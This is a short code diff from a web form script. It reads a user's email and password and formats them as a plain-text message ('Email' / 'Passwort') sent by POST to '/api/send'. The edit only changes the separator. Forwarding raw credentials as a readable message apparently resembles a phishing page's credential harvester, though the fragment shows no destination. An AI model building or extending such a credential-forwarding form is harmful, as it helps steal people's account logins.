@@ -241,7 +241,7 @@
   const email = document.getElementById("email").value.trim();
   const password = document.getElementById("password").value;
 
-  const text = `Email: ${email}: Passwort: ${password}`;
+ const text = `Email: ${email}\nPasswort: ${password}`;
 
   const res = await fetch("/api/send", {
     method: "POST",
